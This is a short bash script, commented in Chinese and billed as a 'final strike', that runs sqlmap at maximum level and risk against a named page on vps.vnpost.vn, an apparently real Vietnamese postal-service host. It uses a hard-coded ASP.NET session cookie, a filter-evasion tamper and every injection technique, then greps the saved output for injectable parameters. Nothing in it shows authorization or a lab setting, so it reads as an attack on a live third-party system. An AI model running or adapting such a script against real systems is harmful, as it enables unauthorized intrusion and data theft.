#!/bin/bash

echo "🔥 最后一击：sqlmap自动化SQL注入检测"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 检查sqlmap
if ! command -v sqlmap &> /dev/null; then
    echo "[*] 安装sqlmap..."
    apt-get update > /dev/null 2>&1
    apt-get install -y sqlmap > /dev/null 2>&1
fi

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
URL="http://vps.vnpost.vn/chamcong/report/inBCC.aspx?ID=MAU2"

echo "[*] sqlmap自动检测..."
echo "  URL: $URL"
echo "  Cookie: $COOKIE"
echo ""

# Level 5 Risk 3 完整测试
sqlmap -u "$URL" \
    --cookie="$COOKIE" \
    --batch \
    --level=5 \
    --risk=3 \
    --tamper=space2comment \
    --threads=5 \
    --technique=BEUSTQ \
    --dbms=MSSQL \
    -v 3 \
    2>&1 | tee sqlmap_full_output.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 sqlmap结果:"
grep -iE "vulnerable|injectable|parameter.*appears|identified|payload" sqlmap_full_output.txt | head -30
